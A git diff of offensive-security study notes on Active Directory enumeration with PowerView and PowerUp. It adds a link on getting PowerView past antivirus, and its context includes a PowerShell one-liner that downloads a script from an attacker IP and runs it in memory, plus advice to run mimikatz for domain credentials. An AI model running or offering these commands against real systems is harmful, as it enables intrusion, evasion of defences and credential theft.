@@ -66,6 +66,8 @@ Powerview is a super useful set of tools for enumerating a domain. It is part of
 
 [https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
+PowerView might be blocked by antivirus, see this funny little article on how to "bypass" it. This actually worked in a real environment in 2018. https://implicitdeny.org/2016/03/powerview-caught-by-sep/
+
 In powerview, there is a super useful function called `Find-LocalAdminAccess` which enumerates which machines the current user is local administrator on. This can be very useful, as you can then remotely execute things like mimikatz on those boxes straight into memory to get the credentials of domain users. If you need an overview of what groups and users are local admin on every box in the environment you can use `Invoke-EnumerateLocalAdmin`
 
 If you want to go hail mary and fuck shit up you can run every single module in Powerview:
@@ -73,6 +75,8 @@ If you want to go hail mary and fuck shit up you can run every single module in 
 In PowerUp.ps1, add `Invoke-AllChecks` at the bottom of the file. This makes the powershell script execute that function straight into memory after the string has been downloaded. This works for any function inside a powershell-script.
 
 `Powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks”`
+
+
 
 ### Mimikatz
 
